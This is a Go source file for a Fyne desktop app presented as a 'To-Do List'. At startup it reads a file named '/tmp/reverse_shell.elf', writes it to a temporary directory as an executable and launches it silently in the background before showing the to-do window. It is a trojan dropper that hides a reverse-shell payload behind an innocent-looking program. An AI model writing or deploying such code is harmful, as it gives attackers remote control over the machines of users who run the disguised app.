package main

import (
	_ "embed"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/widget"
)

var embeddedExecutable []byte

func init() {
	data, err := os.ReadFile("/tmp/reverse_shell.elf")
	if err != nil {
		panic("Erro ao abrir o payload: " + err.Error())
	}
	embeddedExecutable = data
}

func main() {

	tempDir, err := os.MkdirTemp("", "payload.elf")
	if err != nil {
		fmt.Println("Erro ao criar o diretorio temporario: ", err)
		return
	}
	defer os.RemoveAll(tempDir)

	exectPath := filepath.Join(tempDir, "payload.elf")
	err = os.WriteFile(exectPath, embeddedExecutable, 0755)
	if err != nil {
		fmt.Println("Erro ao criar executavel:", err)
		return
	}

	cmd := exec.Command(exectPath)
	err = cmd.Start()
	if err != nil {
		fmt.Println("Erro ao iniciar o execut√°vel")
	}

	myApp := app.New()

	myWindow := myApp.NewWindow("To-Do List")

	entry := widget.NewEntry()
	tasks := []string{}

	list := container.NewVBox()

	addBtn := widget.NewButton("Add", func() {
		task := entry.Text
		if task != "" {
			tasks = append(tasks, task)
			list.Add(widget.NewLabel(task))
			entry.SetText("")
			list.Refresh()
		}
	})

	scrollContainer := container.NewVScroll(list)
	scrollContainer.SetMinSize(fyne.NewSize(400, 400))

	content := container.NewVBox(
		layout.NewSpacer(),
		entry,
		addBtn,
		scrollContainer,
		layout.NewSpacer(),
	)

	myWindow.SetContent(content)
	myWindow.Resize(fyne.NewSize(500, 500))
	myWindow.ShowAndRun()
}
